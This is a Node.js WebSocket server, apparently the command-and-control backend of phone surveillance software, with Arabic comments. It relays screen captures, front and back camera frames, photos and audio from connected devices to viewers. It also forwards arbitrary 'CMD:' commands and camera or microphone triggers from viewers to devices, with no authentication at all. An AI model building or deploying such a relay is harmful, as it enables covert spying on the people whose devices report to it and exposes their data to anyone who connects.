const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8080;
const HOST = '0.0.0.0';

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    if (req.url === '/' || req.url === '/dashboard') {
        fs.readFile(path.join(__dirname, 'dashboard.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading dashboard');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
    } else if (req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'online',
            devices: Array.from(devices.keys()).length,
            viewers: viewers.size,
            uptime: Math.floor((Date.now() - startTime) / 1000) + 's'
        }));
    } else {
        res.writeHead(404);
        res.end('Not found');
    }
});

const wss = new WebSocket.WebSocketServer({
    server,
    maxPayload: 50 * 1024 * 1024
});

const devices = new Map();
const viewers = new Map();
const lastFrames = new Map();
let startTime = Date.now();

wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const deviceId = url.searchParams.get('device');
    const viewerId = url.searchParams.get('viewer') || Math.random().toString(36).substring(7);
    const type = url.searchParams.get('type') || 'viewer';

    console.log(`🔌 ${type}: ${deviceId || viewerId}`);

    const pingInterval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) ws.ping();
    }, 30000);

    if (type === 'device') {
        devices.set(deviceId, { ws, lastSeen: Date.now() });

        broadcastToViewers({
            type: 'device_online',
            deviceId,
            timestamp: Date.now()
        });

        ws.on('message', (data, isBinary) => {
            let message;
            if (isBinary) {
                message = data.toString('base64');
                lastFrames.set(deviceId, { image: message, timestamp: Date.now() });
                broadcastToViewers({
                    type: 'frame',
                    deviceId,
                    image: message,
                    timestamp: Date.now()
                });
            } else {
                message = data.toString();

                // معالجة أنواع الرسائل المختلفة
                if (message.startsWith('CAM_FRAME:')) {
                    broadcastToViewers({
                        type: 'camera_frame',
                        deviceId,
                        image: message.substring(10),
                        camera: 'active',
                        timestamp: Date.now()
                    });
                } else if (message.startsWith('PHOTO:')) {
                    broadcastToViewers({
                        type: 'photo',
                        deviceId,
                        image: message.substring(6),
                        timestamp: Date.now()
                    });
                } else if (message.startsWith('AUDIO:')) {
                    broadcastToViewers({
                        type: 'audio_data',
                        deviceId,
                        audio: message.substring(6),
                        timestamp: Date.now()
                    });
                } else if (message.startsWith('STATUS:')) {
                    broadcastToViewers({
                        type: 'device_status',
                        deviceId,
                        status: message.substring(7),
                        timestamp: Date.now()
                    });
                } else {
                    // صورة شاشة عادية
                    lastFrames.set(deviceId, { image: message, timestamp: Date.now() });
                    broadcastToViewers({
                        type: 'frame',
                        deviceId,
                        image: message,
                        timestamp: Date.now()
                    });
                }
            }

            if (devices.has(deviceId)) {
                devices.get(deviceId).lastSeen = Date.now();
            }
        });

        ws.on('close', () => {
            clearInterval(pingInterval);
            devices.delete(deviceId);
            broadcastToViewers({
                type: 'device_offline',
                deviceId,
                timestamp: Date.now()
            });
        });

    } else {
        viewers.set(viewerId, ws);

        const deviceList = Array.from(devices.keys()).map(id => ({
            id,
            online: true,
            lastSeen: devices.get(id).lastSeen
        }));

        safeSend(ws, { type: 'device_list', devices: deviceList });

        // إرسال آخر الإطارات
        lastFrames.forEach((frame, devId) => {
            if (Date.now() - frame.timestamp < 10000) {
                safeSend(ws, {
                    type: 'frame',
                    deviceId: devId,
                    image: frame.image,
                    timestamp: frame.timestamp
                });
            }
        });

        // أوامر من المشاهد إلى الجهاز
        ws.on('message', (data) => {
            const msg = data.toString();
            // أوامر خاصة للجهاز
            if (msg.startsWith('CMD:')) {
                const cmdDeviceId = msg.split(':')[1];
                const command = msg.substring(msg.indexOf(':', 4) + 1);
                if (devices.has(cmdDeviceId)) {
                    const device = devices.get(cmdDeviceId);
                    if (device.ws.readyState === WebSocket.OPEN) {
                        device.ws.send(command);
                    }
                }
            } else if (msg.startsWith('CAM_FRONT') || msg.startsWith('CAM_BACK') ||
                       msg.startsWith('CAM_STOP') || msg.startsWith('AUDIO_') ||
                       msg.startsWith('PHOTO')) {
                // إرسال للأجهزة المتصلة
                devices.forEach((device) => {
                    if (device.ws.readyState === WebSocket.OPEN) {
                        device.ws.send(msg);
                    }
                });
            }
        });

        ws.on('close', () => {
            clearInterval(pingInterval);
            viewers.delete(viewerId);
        });
    }
});

function safeSend(ws, data) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        try { ws.send(JSON.stringify(data)); } catch (e) {}
    }
}

function broadcastToViewers(data) {
    const message = JSON.stringify(data);
    viewers.forEach((ws) => {
        if (ws.readyState === WebSocket.OPEN) {
            try { ws.send(message); } catch (e) {}
        }
    });
}

setInterval(() => {
    const now = Date.now();
    devices.forEach((device, id) => {
        if (now - device.lastSeen > 60000) {
            device.ws.close();
            devices.delete(id);
            broadcastToViewers({ type: 'device_offline', deviceId: id, timestamp: now });
        }
    });
    lastFrames.forEach((frame, id) => {
        if (now - frame.timestamp > 30000) lastFrames.delete(id);
    });
}, 30000);

server.listen(PORT, HOST, () => {
    console.log(`=================================`);
    console.log(`  🚀 NEXUS STREAM SERVER`);
    console.log(`  🌐 http://${HOST}:${PORT}`);
    console.log(`  📡 WebSocket Ready`);
    console.log(`=================================`);
});
